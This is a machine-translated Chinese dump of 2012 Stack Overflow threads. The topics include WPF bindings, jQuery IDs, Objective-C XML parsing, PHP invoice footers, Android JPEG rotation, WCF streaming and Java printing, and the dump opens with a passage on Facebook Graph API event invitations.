> 您可以通过向 /EVENT_ID/invited/USER_ID 发出 HTTP POST 来邀请用户参加活动。您可以通过向 /EVENT_ID/invited?users=USER_ID1,USER_ID2,USER_ID3 发出 HTTP POST 来邀请多个用户。这两个都需要 create_event 权限，如果邀请成功则返回 true。

**读**

您可以通过向 /EVENT_ID/invited 发出 HTTP GET 来读取事件的受邀者列表：

[https://graph.facebook.com/331218348435/invited](https://graph.facebook.com/331218348435/invited)

您可以通过向 /EVENT_ID/invited/USER_ID 发出 HTTP GET 来检查特定用户是否已被邀请参加活动：

[https://graph.facebook.com/331218348435/invited/2503747](https://graph.facebook.com/331218348435/invited/2503747)

您需要 user_events 或friend_events 权限才能查看非公开活动的邀请列表。

这些调用返回一个具有名称、id 和 rsvp_status（'not_replied'、'unsure'、'attending' 或 'declined'）字段的对象。在检查特定用户时，如果该用户未被邀请参加活动，API 将返回一个空数据数组。

**删除**

您可以通过向 /EVENT_ID/invited/USER_ID 发出 HTTP DELETE 来取消邀请用户参加活动。如果请求成功，则返回 true。用户必须是事件的管理员（即创建者）才能使此调用成功。需要 rsvp_event 权限。

# c# - 创建绑定列表

> ID：11396309
> 
> 赞同：0
> 
> 时间：2012-07-09T13:45:42.270
> 
> 标签：c#, .net, wpf, xaml, data-binding

我正在尝试在 a 上设置两个`Binding`s 中的一个（基于一组 s 中的选择`ListBox`）。`ItemsSource``RadioButton`

我现在拥有的是：

```
<ListBox>
    <ListBox.Resources>
        <Binding x:Key="AllBinding" Path="ItemsSource.AllLeaves" ElementName="EmployeeTree" />
        <Binding x:Key="FolderBinding" Path="SelectedItem.Leaves" ElementName="EmployeeTree" />
    </ListBox.Resources>
</ListBox> 
```

然后理想情况下，我会`ItemsSource`根据用户的选择将其中一个设置为 。

但是我在两个s上都收到了这个错误`Binding`：

> 不能在“DictionaryEntry”类型的“值”属性上设置“绑定”。只能在 DependencyObject 的 DependencyProperty 上设置“绑定”。

我该如何实现这个要求？甚至可以定义`Binding`s 以便我可以将它们从后面的代码中交换出来吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T14:10:03.673

听起来您正在尝试`TreeView.ItemsSource`根据某些`ListBox`.

如果是这种情况，`DataTrigger`您应该`EmployeeTree`根据`TreeView.ItemsSource`或`ListBox.SelectedItem``ListBox.SelectedIndex`

```
<Style x:Key="EmployeeTreeStyle" TargetType="{x:Type TreeView}">
    <!-- By default bind to MyListBox.SelectedItem.Leaves -->
    <Setter Property="ItemsSource" Value="{Binding ElementName=MyListBox, Path=SelectedItem.Leaves}" />
    <Style.Triggers>
        <!-- If SelectedIndex = 0, bind to AllLeaves instead -->
        <DataTrigger Binding="{Binding ElementName=MyListBox, Path=SelectedIndex}" Value="0">
            <Setter Property="ItemsSource" Value="{Binding AllLeaves}" />
        </DataTrigger>
    </Style.Triggers>
</Style> 
```

**根据下面的评论更新**

```
<Style x:Key="EmployeeTreeStyle" TargetType="{x:Type TreeView}">
    <Style.Triggers>
        <!-- Set ItemsSource based on which RadioButton is Selected -->
        <DataTrigger Binding="{Binding ElementName=RadioButton1, Path=IsChecked}" Value="True">
            <Setter Property="ItemsSource" Value="{Binding AllLeaves}" />
        </DataTrigger>
        <DataTrigger Binding="{Binding ElementName=RadioButton2, Path=IsChecked}" Value="True">
            <Setter Property="ItemsSource" Value="{Binding ElementName=RadioButton2, Path=DataContext.Leaves}" />
        </DataTrigger>
    </Style.Triggers>
</Style> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:07:02.010

我不完全确定您的要求...但我会先给出。

如果您将 DataContext 设置为这样的东西；

```
 public class PresentationModel : INotifyPropertyChanged
{
    private object _userPropertyA;
    public object UserPropertyA
    {
        get { return _userPropertyA; }
        set
        {
            _userPropertyA = value;

            //Set the data source based on the value of the selected?
            DataSource = new List<object>();
        }
    }

    private object _userPropertyB;
    public object UserPropertyB
    {
        get { return _userPropertyB; }
        set
        {
            _userPropertyB = value;

            //Set the data source based on the value of the selected?
            DataSource = new List<object>();
        }
    }

    public List<object> DataSource { get; set; }

    #region Implementation of INotifyPropertyChanged

    public void OnPropertyChanged(string propertyName)
    {
        if (this.PropertyChanged != null)
            this.PropertyChanged(this, new PropertyChangedEventArgs(propertyName));
    }

    public event PropertyChangedEventHandler PropertyChanged;

    #endregion
} 
```

然后将属性绑定到所需的控件

这将允许您根据用户传递的值更改数据源。

当然，您还需要实现 INotifyPropertyChanged。

这有帮助吗？

干杯。圣。

# php - 怎么找回id

> ID：11396310
> 
> 赞同：0
> 
> 时间：2012-07-09T13:45:43.783
> 
> 标签：php, jquery

我有一个 php 代码，它显示来自 AZ 的按钮：

```
 <table id="optionAndAnswer" class="optionAndAnswer">
    <tr class="answer">
    <td>3\. Answer</td>
    <td>
        <?php
            $a = range("A","Z");
        ?>

        <table id="answerSection">
            <tr>

        <?php
            $i = 1;
            foreach($a as $key => $val){
                if($i%7 == 1) echo"<tr><td>";
                echo"<input type=\"button\" onclick=\"btnclick(this);\" value=\"$val\" id=\"answer".$val."\" name=\"answer".$val."Name\" class=\"answerBtns answers answerBtnsOff\">";      
                if($i%7 == 0) echo"</td></tr>";
                $i++;
            }
        ?>

... 
```

我要做的是在 jquery 中为上述代码创建一个模板，这样如果用户想要将这些按钮添加到一个块中，那么 jquery 可以用于将这些按钮添加到一个块中，就像模板一样。

下面是jquery代码：

```
var $this, i=0, $row, $cell;
$('#optionAndAnswer .answers').each(function() {
    $this = $(this);
    if(i%7 == 0) {
        $row = $("<tr/>").appendTo($answer);
        $cell = $("<td/>").appendTo($row);
    }
    var $newBtn = $("<input class='answerBtnsRow answers' type='button' style='display:%s;' onclick='btnclick(this);' />".replace('%s',$this.is(':visible')?'inline-block':'none')).attr('name', $this.attr('name')).attr('value', $this.val()).attr('class', $this.attr('class'));

    $newBtn.appendTo($cell);

    i++;
}); 
```

现在这工作正常，但我有一个问题。如果你看 php 代码，每个按钮都有自己的 id，在我的 jquery 代码中，每个按钮都没有自己的 id。在我的 jquery 代码中，我希望每个按钮与 php 代码中的对应按钮具有相同的 id，唯一的区别是我希望 jquery 按钮 id 以“Row”结尾。例如，如果 php 中按钮 F 的 id 是`#answerF`，那么我希望 jquery 中的按钮 F 具有 id `#answerFRow`。

我的问题是这可能吗？如果我把它放在 jquery 代码中，这段代码是否能够从 php 代码中检索按钮 ID：

```
.attr('id', $this.attr('id')) 
```

以及如何在末尾插入“行”一词？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:04:14.303

Javascript 使用 + 运算符`str='over'+'flow';` 连接字符串，PHP 使用 . 运算符 `$str='over'.'flow';` 因此在您的 jquery 中它可以是：`.attr('id', this.id+'ROW')`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:48:13.630

```
.attr('id', $this.attr('id')+'Row') 
```

PHP 只生成文本、HTML，浏览器读取并呈现这些文本。因此，如果 PHP 代码写入 ID，则 jQuery 可以读取它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T13:49:17.687

最好的方法是从 php 对象创建一个 javascript 数组对象，然后使用这个数组对象来检索 id

```
lang=new Object();
<? foreach($a as $key=>$value){ ?>
  lang[<?=$key?>] ='<?=$value?>' 
<? } ?> 
```

现在您可以使用这个 java 脚本对象“lang”来获取您的 keyValues。

# java - 寻找独立的类加载器

> ID：11396315
> 
> 赞同：0
> 
> 时间：2012-07-09T13:45:49.700
> 
> 标签：java, classloader, packaging, ear

我确实有一个独立的 java 程序，其中包含我自己的 jar 和许多依赖库作为单个存档（构建 wby maven，实际上总共 15 个 JAR 文件）。是否有人已经有了一个很好的解决方案，她/他可以向我推荐如何避免这种情况并使包装更智能？

例如，像 EAR 档案这样的打包会很棒，但是我可以从我的 NON-Java EE 应用程序中使用任何独立的 EAR 类加载器吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T13:48:54.880

有[Eclipse Fat Jar 插件](http://fjep.sourceforge.net/)。用他们自己的话来说：

> Fat Jar Eclipse 插件是一种部署工具，可将 Eclipse java 项目部署到一个可执行 jar 中。
> 
> 它将条目“Build Fat-JAR”添加到 Export-Wizard。除了 eclipse 标准 jar-exporter 引用的类和 jar 都包含在“Fat-Jar”中，因此生成的 jar 包含所有需要的类，可以直接使用“java -jar”执行，无需设置类路径，无需部署额外的 jar。
> 
> 插件考虑了罐子、外部罐子、用户库、系统库、类文件夹和项目导出。可以选择主类并合并清单文件。[One-JAR 选项集成了一个由 Simon Tuffs ( http://one-jar.sourceforge.net/](http://one-jar.sourceforge.net/) )编写的专用类加载器， 它处理 jar 中的 jar 文件。可以将单个文件和文件夹排除或添加到 jar 中。可以通过上下文菜单将不同的设置存储并重新执行为“快速构建”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:05:28.990

好吧，我不知道您使用的是哪个IDE。我有 Eclipse Indigo (3.7)。对我来说，步骤很简单：

1.  右键单击您的 Java 项目文件夹
2.  点击导出
3.  在出现的窗口中选择 Java>Runnable JAR 文件，然后单击下一步
4.  在下一个窗口中，选择您希望程序运行的配置
5.  选择您的目标文件夹
6.  在“库处理：”部分*确保*您选择“将所需库提取到生成的 JAR”中，这将解压缩您的库，然后将它们重新打包到您完成的 .jar 中
7.  点击完成
8.  你完成了！享受。

如果您的 Eclipse 版本低于 Ganymede (3.4)，您需要获取[Fat Jar Plug-in](http://fjep.sourceforge.net/)。

# objective-c - 使用 NSData 解析 xml

> ID：11396316
> 
> 赞同：1
> 
> 时间：2012-07-09T13:46:04.423
> 
> 标签：objective-c, xml, cocoa, nsxmlparser, nsdata

我正在使用可可，我想解析一个 xml 文件。
但是我的代码中有 2 个警告

`incompatible Objective-C types 'struct NSString *', expected 'struct NSURL *' when passing argument 1 of 'initWithContentsOfURL:' from distinct Objective-C type` 和`class 'XMLParser' does not implement the 'NSXMLParserDelegate' protocol`

这是我的代码：

```
int main(int argc, char *argv[])
{

    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    NSData *data = [[NSData alloc] initWithContentsOfURL:@"/Users.xml"]; // here is the first warning
    // create and init NSXMLParser object
    NSXMLParser *nsXmlParser = [[NSXMLParser alloc] initWithData:data];

    // create and init our delegate
    XMLParser *parser = [[XMLParser alloc] initXMLParser];

    // set delegate
    [nsXmlParser setDelegate:parser]; // here is the second warning

    // parsing...
    BOOL success = [nsXmlParser parse];

    // test the result
    if (success) {
        NSLog(@"No errors");// - user count : %i", [parser [users count]]);
        // get array of users here
        //  NSMutableArray *users = [parser users];
    } else {
        NSLog(@"Error parsing document!");
    }

    [parser release];
    [nsXmlParser release];
    [pool drain];

    return NSApplicationMain(argc,  (const char **) argv);
} 
```

请问我该如何解决？当我运行时，它告诉我程序收到信号 SIGABRT 并且它不起作用

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:50:43.950

嗯，有一个 NSURL 类......你需要传递其中一个，就像警告说的那样。

并且不要将解析器的委托设置为解析器本身。如果您不需要委托，请不要设置委托。委托用于回调，因此您的应用程序可以在解析期间进行操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:51:06.870

initWithContentsOfURL：需要[NSURL](http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSURL_Class/Reference/Reference.html)作为参数而不是文件名，因此您需要从文件名构造一个，例如

```
NSURL* url = [NSURL fileURLWithPath:@"/Users.xml"]; 
```

你不需要 NSdata 所以直接做

```
NSXMLParser *parser = [[NSXMLParser alloc] initWithContentsOfURL:[NSURL fileURLWithPath:@"/Users.xml"]]; 
```

当您设置委托时，您委托的对象必须实现说它实现了 NSXMLParserDelegate 协议 - 在[Apple 文档](http://developer.apple.com/library/ios/#documentation/cocoa/Conceptual/XMLParsing/Articles/UsingParser.html)中，它将委托设置为自身，而不是 XMLParser 什么都不做，在其他示例中，委托实现了它需要的那些方法。

请参阅[SeismicXML 示例](http://developer.apple.com/library/ios/#samplecode/SeismicXML/Listings/Classes_ParseOperation_m.html#//apple_ref/doc/uid/DTS40007323-Classes_ParseOperation_m-DontLinkElementID_6)

委托被声明为 `@interface ParseOperation () <NSXMLParserDelegate>`并实现了 NSXMLParserDelegate 中的一些方法

所以在你的情况下，你需要`@interface XMLParser () <NSXMLParserDelegate>`并实现你想要的方法。

# javascript - 如何从 ASP.NET 中的 MenuItem 调用 onClick 事件？

> ID：11396321
> 
> 赞同：0
> 
> 时间：2012-07-09T13:46:44.173
> 
> 标签：javascript, asp.net, code-behind

由于ASP.NET中没有for 属性，您如何调用`onclick`事件？`MenuItem``OnClick``MenuItem`

使用`NavigateUrl`我们可以导航到特定的 url，但是一旦我点击`MenuItem`它就会触发一个事件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T13:48:48.527

菜单有`MenuItem.MenuItemClick`事件，你可以用它来做任何你想做的事情`onclick`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T13:52:19.773

您可以使用`Menu.MenuItemClick`包含您的菜单项的菜单事件：

[http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.menu.menuitemclick.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.menu.menuitemclick.aspx)

```
<asp:Menu runat="server" ID="MyMenu" onmenuitemclick="MyMenu_MenuItemClick" ... >
    ...
</asp:Menu> 
```

单击任何没有`NavigateUrl`设置属性的菜单项将导致页面回发并执行`Menu.MenuItemClick`事件处理程序。

# php - 如何在每个打印页面上打印页脚？

> ID：11396322
> 
> 赞同：0
> 
> 时间：2012-07-09T13:46:48.867
> 
> 标签：php, opencart, invoice

我正在使用 Open Cart 为我的公司开发一个订购系统。
一切都在 PHP 和 HTML 中完成。

我正在尝试修改发票页面以在打印发票的底部包含一个签名行。发票可以根据行/项目的数量延伸到多页，也可以批量处理，以便要打印的一个文档有多个发票（使用循环）。我不是网络开发人员，并且已经达到了我完成项目这一部分的能力的尽头。请给我指点或伪代码示例。

**页脚代码：**

```
<style type="text/css">
    .picklistCheck{
        width:15px;
        height:15px;
        border:1px solid #c7c7c7;
        margin:0 auto;
        border-radius:2px;
        box-shadow:inset 0px 0px 2px rgba(0,0,0,0.1);
        font-size:14pt;
    }
    .signature{
        border-bottom-style:solid;
        font-size:14pt;
        page-break-after:always;
    }
    td{
        font-size:14pt;
    }
</style>

<?php
    foreach ($orders as $order) {
        ?>
        //<div>orders go here </div>
        <?php
    }
    include ("footer.php");
?> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:22:27.553

每次您的逻辑决定在发票中放置分页符时，告诉它也插入以下代码：

```
<?php include ("footer.php"); ?> 
```

使用要放置在页脚中的简单 html 创建一个 footer.php 文件。上面的代码假设 `your script`并且`footer.php`在同一目录中。

**编辑：** *回答您的评论，*

[`Include`PHP.net](http://php.net/manual/en/function.include.php)的行为与您实际复制粘贴所有代码的行为完全一样，而不是包含它。但是每个包含文件都应该在需要的地方有自己的`<?php ?>`标签。如果没有`<?php ?>`标签，Control 只会输出它在那里看到的任何内容。

Footer.php 可以是一个简单的纯 HTML 文件：

```
<div id="footer">
    Company XYZ (c)2000-2012 All Copyrights Reserved
    Some other footer text.
</div> 
```

您也可以将其命名为页脚。**html**，但是如果以后，您决定将一些动态数据放在页脚中，那么将很难更改`.html`为`.php`在各种文件中编写的所有包含行。

动态页脚示例：

```
<div id="footer">
    Company XYZ (c)2000-2012 All Copyrights Reserved
    <?php echo $who_printed." ".$who_authorized; ?>
</div> 
```

当然这只是一个简单的例子。

在 html 页面中，您可以通过在外部链接的 .css 文件中使用以下 CSS 代码来强制使用 div：

```
#footer{
text-align: right;
height: 20px;
position:fixed;
margin:0px;
bottom:0px;
} 
```

`position:fixed;`&`bottom:0px;`在这里做的伎俩。`"footer" div`即使页面滚动或其他情况，它也会迫使它始终保持在底部。就像 Facebook 将其标题菜单放在顶部和聊天栏底部的方式一样。您还可以定义左、右属性

**更新：**好的，根据您的评论，这里是示例代码：

在 CSS 样式部分，使用：

```
.signature{
    border-bottom-style:solid;
    font-size:14pt;
    page-break-after:always;

    text-align: center;
    height: 20px;
    width: 100%;
    margin:0px auto;
    position:fixed;
    bottom:0px;
} 
```

所有属性都是不言自明的。`Text-align`使文本居中对齐。`Width`正在使这个 div`.signature`在页面上 100% 宽。需要将 div 两边的边距相等。`Margin`是说`0px`在顶部和底部以及左右两侧放置边距`auto`。`Position`使其固定在视口/页面上。`Bottom`说`0px`从底部保持。

在页面正文中，使用以下代码：

```
<?php
    foreach ($orders as $order) {
        ?>
        //<div class="order">order1 go here </div>
        //<div class="order">order2 go here </div>
        //<div class="order">order3 go here </div>
        //<div class="order">order4 go here </div>
        <?php
    } // for each ENDS
?>

<div class="signature">
      Authorized by <?php echo $who_authorized; ?> |
      Printed by <?php echo $who_printed; ?>
</div><!--//signature--> 
```

它只是将您在 CSS 样式中定义的任何属性分配给`signature`div。显然，您需要将此片段包装到您的逻辑中，该逻辑决定何时回显/引入`signature`div。此外，$who_authorized 和 $who_printed 需要保持一些价值。

对于任何大于 3 行的块，我总是`?>`使用 PHP 解析器/控件 ( ) 并根据需要简单地编写 HTML。然后，当需要时，我再次输入 PHP ( `<?php`)

如果你想用`include`，你可以省略最后 6 行（从我的代码开始`?>`& 以`<!--//signature-->`我的代码结束，只需将这一行放在那里。

```
include ("footer.php");
?> 
```

此选项还要求您在同一目录中创建一个名为的文件`footer.php`，并在其中插入以下 html 代码。

```
<div class="signature">
      Authorized by <?php echo $who_authorized; ?> |
      Printed by <?php echo $who_printed; ?>
</div><!--//signature--> 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-07-09T14:08:35.197

What format do your invoices have? You should create them as a PDF File to print them out. There you can try to define a footnote - based on the used php pdf library

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-07-09T13:49:26.377

使用要放置在页脚中的 html 创建一个 footer.php 文件。

将此代码放置在您希望将页脚放置在发票页面上的位置：

```
<?php include 'footer.php'?> 
```

修改页脚，修改footer.php

# android - 保存的 JPEG 是旋转后从磁盘加载的 JPEG 的两倍

> ID：11396328
> 
> 赞同：2
> 
> 时间：2012-07-09T13:47:11.473
> 
> 标签：android

在我的应用程序中，我使用`ACTION_IMAGE_CAPTURE`Intent 来拍照。当相机返回时，检查文件，如果旋转是纵向的，则旋转位图并使用以下代码保存到磁盘：

```
BitmapFactory.Options options = new Options();
options.inPreferredConfig = Bitmap.Config.RGB_565;
Bitmap bmp = BitmapFactory.decodeFile(f.getAbsolutePath(), options);
if (bmp != null) {
    Matrix m = new Matrix();
    m.postRotate(90);
    Bitmap rotated = Bitmap.createBitmap(bmp, 0, 0, bmp.getWidth(), bmp.getHeight(), m,
                                        true);
    rotated = rotated.copy(Bitmap.Config.RGB_565, false); // added based on comment
    f.delete();
    FileOutputStream fos = new FileOutputStream(f);
    rotated.compress(Bitmap.CompressFormat.JPEG, 100, fos);
    fos.close();
} 
```

这可以正常工作，但文件大小是未旋转图片的两倍。我尝试将密度设置`BitmapFactory.Options`为 0 并将比例设置为 false，但都没有达到预期的效果。我希望我转换的图像与我从磁盘加载的图像大小相同。我的代码中有什么东西可以防止这种情况发生吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-09T13:52:34.547

您的原始 JPEG 使用 RGB565，每像素使用 2 个字节。从此文件派生的内存位图使用“正常”格式，每像素 4 个字节；当它被保存到一个新的 JPEG 时，它以更密集的格式保存，因此是两倍大小（这与它的旋转无关）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:02:26.193

[您可以旋转 JPEG 图像，而无需使用ExifInterface](http://developer.android.com/reference/android/media/ExifInterface.html)实际解码和重新压缩它的像素。例子：

```
ExifInterface exif = new ExifInterface(filename);
int old_orientation = exif.getAttributeInt(ExifInterface.TAG_ORIENTATION, 1);
int new_orientation = ...; // implement your business logic here
exif.setAttribute(TAG_ORIENTATION, new_orientation);
exif.saveAttributes(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-09T13:51:26.530

这可能是因为您在转换为 JPEG 时不允许任何有损压缩。尝试将质量设置为 90 或 80，这应该会显着减小文件大小。

不要被“有损”这个词吓到。这是 JPEG 的重要组成部分，这就是为什么它获得了它所做的压缩级别，但损失对人眼来说并不那么明显。

# wcf - WCF - 返回自定义列表

> ID：11396341
> 
> 赞同：0
> 
> 时间：2012-07-09T13:48:01.510
> 
> 标签：wcf

我正在使用 WCF 并尝试将对象列表（或数组）返回给我的客户端。它似乎适用于标准类型，我可以返回自定义对象，但不能返回自定义对象列表（即使列表中只有一项）。

我已经阅读了大量有关该主题的内容，但似乎无法理解。编译正常，但是在客户端，当我到达我的函数时，客户端抛出异常

> “接收 HTTP 响应时发生错误。这可能是由于服务端点绑定未使用 HTTP 协议。这也可能是由于服务器中止了 HTTP 请求上下文（可能是由于服务关闭）。有关更多详细信息，请参阅服务器日志。”

我尝试了一些想法，目前我的对象如下所示：

```
[DataContract]
    public class FilePacket : IDisposable
    {
        //[MessageHeader(MustUnderstand = true)]
        [DataMember]
        public string fileName;

        //[MessageHeader(MustUnderstand = true)]
        [DataMember]
        public long fileSize;

        //[MessageBodyMember(Order = 1)]
        [DataMember]
        public System.IO.Stream fileByteStream;

        public void Dispose()
        {
            if (fileByteStream != null)
            {
                fileByteStream.Close();
                fileByteStream = null;
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T19:05:39.033

您要做的第一件事是检查您是否在绑定中使用`transferMode`as 。`Streamed`

```
<system.serviceModel>
     …
    <bindings>
      <basicHttpBinding>
        <binding name="ExampleBinding" transferMode="Streamed"/>
      </basicHttpBinding>
    </bindings>
     …
<system.serviceModel> 
```

你应该使用的第二件事`MessageContract`。

```
[MessageContract]
public class FilePacket
{
   [MessageHeader]
   public string fileName;

   [MessageBodyMember]
   public System.IO.Stream fileByteStream;

   ...
} 
```

除了`fileByteStream`你应该用属性装饰的其余`MessageHeader`属性。

最后一件事是确保您为`maxReceivedMessageSize`属性设置了正确的值以克服大小限制。

请参阅这些参考资料

[http://msdn.microsoft.com/en-us/library/ms733742.aspx](http://msdn.microsoft.com/en-us/library/ms733742.aspx)

[http://msdn.microsoft.com/en-us/library/ms789010.aspx](http://msdn.microsoft.com/en-us/library/ms789010.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-10T09:25:46.653

我现在已经完成了这项工作（感谢大家的帮助）。似乎有各种各样的事情可能出错并导致问题。首先，我从 Stream 变成了 MemoryStream；并确保它在整个过程中都被使用（我在尝试一些选项时注意到你可以将 DataContract 设置为使用 Stream，实际上是在使用 FileStream；这造成了严重破坏，并花了几分钟时间才注意到） .

我从 DataContract 更改为 MessageContract（确保将 MemoryStream 设置为 [MessageBodyMember(Order = 1)]）。

在 App Config 中，我将 transferMode 设置为“Streamed”，并确保将 maxBufferSize 设置为一个巨大的值。

# java - 用 Java 打印数据

> ID：11396343
> 
> 赞同：2
> 
> 时间：2012-07-09T13:48:12.797
> 
> 标签：java, swing, printing, jbutton

我有一个表单，用户可以在其中填写数据字段。此后，他/她将能够将数据导出为我已经编写的 pdf 文件，如下所示：

```
public void onSubmit() {
try {
    ManagerModel manager = managerDao.getManager(person);
    PictureModel picture = new PictureModel();
    if (person.getPhotoId() != null) {
        picture = new PictureModel(pictureDao.findPictureById(person.getPhotoId()));
    }
    getRequestCycle().setRequestTarget( new FileRequestTarget(Exporter.exportFile(person, manager, picture), person.getPdfName()));
} catch (Exception e) {
    Log.warn(e);
} 
```

现在，这为我提供了 pdf 导出以及所有数据。我还想创建一个按钮，允许用户打印在这些字段中输入的数据。现在，这应该是表单上的打印按钮，而不是要求用户导出然后打印。

有人可以建议我如何创建此打印按钮吗？我应该只使用 pdf 导出的输出然后将其发送到打印机吗？如果是这样，我该如何在java中编写它？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-09T13:54:27.637

那么您可以通过简单的方式创建一个按钮：

```
 import javax.swing.*;
 ....
 JButton button = new JButton("Print"); 
```

然后`ActionListener`在按钮上添加一个：

```
import java.awt.*;
....
button.addActionListener(new ActionListener() {
            @override
            public void actionPerformed(ActionEvent e)
            {
                //Execute when button is pressed
                printPDF("path/to/file/.pdf");
            }
        }); 
```

然后要打印 PDF，您可以使用此方法：

```
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import javax.print.*;
import javax.print.attribute.HashPrintRequestAttributeSet;
import javax.print.attribute.PrintRequestAttributeSet;
....
public static void printPDF(String file) {

    FileInputStream psStream = null;
    try {
        psStream = new FileInputStream(file);
    } catch (FileNotFoundException ffne) {
        ffne.printStackTrace();
    }
    if (psStream == null) {
        return;
    }
    DocFlavor psInFormat = DocFlavor.INPUT_STREAM.AUTOSENSE;
    Doc myDoc = new SimpleDoc(psStream, psInFormat, null);
    PrintRequestAttributeSet aset = new HashPrintRequestAttributeSet();
    PrintService[] services = PrintServiceLookup.lookupPrintServices(psInFormat, aset);

    // this step is necessary because I have several printers configured  
    PrintService myPrinter = null;
    for (int i = 0; i < services.length; i++) {
        String svcName = services[i].toString();
        System.out.println("service found: " + svcName);
        if (svcName.contains("printer closest to me")) {
            myPrinter = services[i];
            System.out.println("my printer found: " + svcName);
            break;
        }
    }
    if (myPrinter != null) {
        DocPrintJob job = myPrinter.createPrintJob();
        try {
            job.print(myDoc, aset);

        } catch (Exception pe) {
            pe.printStackTrace();
        }
    } else {
        System.out.println("no printer services found");
    }
} 
```

附录：

*   要使其在可能没有“离我最近的打印机”的特定打印机上工作：更改此代码以包含您的打印机名称，或分别使用`contains()`or的确切打印机名称`equals()`：

    ```
    String printerName="";
    ....
    if (svcName.contains(printerName)||svcName.equals(printerName)) {
                        myPrinter = services[i];
                        System.out.println("my printer found: " + svcName);
                        break;
    } 
    ```

**参考：**

*   [打印 PDF Java](http://www.coderanch.com/t/410208/java/java/java-printing-printing-pdf)
*   [如何在 Java 中将 ActionListener 添加到 JButton 上](https://stackoverflow.com/questions/284899/how-do-you-add-an-actionlistener-onto-a-jbutton-in-java)
*   [如何创建 JButton](http://www.apl.jhu.edu/~hall/java/Swing-Tutorial/Swing-Tutorial-JButton.html)

# php - PHP：从 HTML 代码字符串中提取规范标签

> ID：11396345
> 
> 赞同：0
> 
> 时间：2012-07-09T13:48:16.543
> 
> 标签：php, html-parsing

我将首先在[这里提到我关于这个问题的第一个问题](https://stackoverflow.com/questions/11359502/php-regular-expression-for-ul-lists)

我需要的是`<ul>`从 HTML 字符串中获取数组中的所有列表，这样我就可以通过将每个列表分成两半（从一个列表中创建两个列表）来操作它们，以通过浮动它们来将每个列表显示在两列中。例子：

资源：

```
Lorem ipsum dolor et amet...<br />
<ul>
    <li>List item 1</li>
    <li>List item 2</li>
    <li>List item 3</li>
    <li>List item 4</li>
</ul>
Lorem ipsum dolor et amet...<br />
NEXT UL LIST GOES HERE... etc.. 
```

需要的结果：

```
Lorem ipsum dolor et amet...<br />
<div style="overflow:hidden;">
  <ul>
    <li>List item 1</li>
    <li>List item 2</li>
  </ul>
  <ul>    
    <li>List item 3</li>
    <li>List item 4</li>
  </ul>
</div>
NEXT UL LIST GOES HERE... etc.. 
```

我知道 CSS 浮动`<li>`，但这会以错误的顺序给出列表，例如：

```
Lorem ipsum...
list item 1     list item 2
list item 3     list item 4
list item 5     list item 6 
```

什么是不需要的。所以我决定解决方案可以将每个列表分成两半（从一个列表中创建两个列表），然后将它们浮动。

正如您在我之前的问题中看到的那样，我的第一个想法是使用`preg_match_all()`PHP 函数来实现。但是效果不是很好。正如用户所建议的那样，使用正则表达式来解析 HTML 是一个坏主意，所以：

有人可以通过使用 DOMDocument 或任何其他方法来解释如何做到这一点吗？如何从 html 内容中提取列表，以便我可以根据需要对其进行操作？

# ios - ios 应用程序中 Spotify 曲目的音频混合

> ID：11396348
> 
> 赞同：0
> 
> 时间：2012-07-09T13:48:20.837
> 
> 标签：ios, audio, offline, spotify, mixing

我的基本要求是混合两个或多个音频文件（如 DJ 类应用程序）。我可以使用本地音频文件来做到这一点。但我想知道我是否可以同时播放两个或多个 Spotify 曲目..？或者播放我的本地文件和Spotify Track ..？

所以，我想做的就是让Spotify中的歌曲在我的应用程序的音频单元中播放，这些音频单元能够混合而不是Spotify的音频播放器。

请建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:37:20.293

如果您使用 CocoaLibSpotify（Spotify Mac/iOS 库），您将获得解码音频的原始 PCM 数据流。库中包含的代码使用 Core Audio 将数据传输到扬声器，但您当然可以将不同的音频单元添加到图表中以实现您想要的结果。

例如，这篇博文（由我撰写）讨论了向图形添加图形 EQ：[Core Audio：CocoaLibSpotify 中的 AUGraph Basics](http://ikennd.ac/blog/2012/04/augraph-basics-in-cocoalibspotify/)。那篇文章很可能是制作更复杂的图表以满足您的需求的一个很好的起点。

值得一提的是，Spotify 服务一次只允许您流式传输一个音轨，因此您只能将一个 Spotify 音轨与本地音轨进行现场混音。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:12:09.147

如果 Spotify 允许您直接从音频流或文件中提取，那么您当然可以使用 Core Audio 来执行此操作。不幸的是，AV Foundation 无法进行任何实时音频处理（尽管这在 iOS 6 中有所改变），因此您可能不得不使用 Core Audio 来组合您的音频流（无论是本地还是远程），然后使用您的音频单元来进行实际的音频处理。

# c++ - 成员拥有参数所有权

> ID：11396349
> 
> 赞同：6
> 
> 时间：2012-07-09T13:48:27.713
> 
> 标签：c++, constructor, c++11, move-semantics, ownership

对于成员拥有参数的问题，我看到了两种合理的解决方案：

```
Foo::Foo(std::unique_ptr<int> parameter)
: member(std::move(parameter))
{
}

Bar::Bar(std::unique_ptr<int> parameter)
{
    member.swap(parameter);
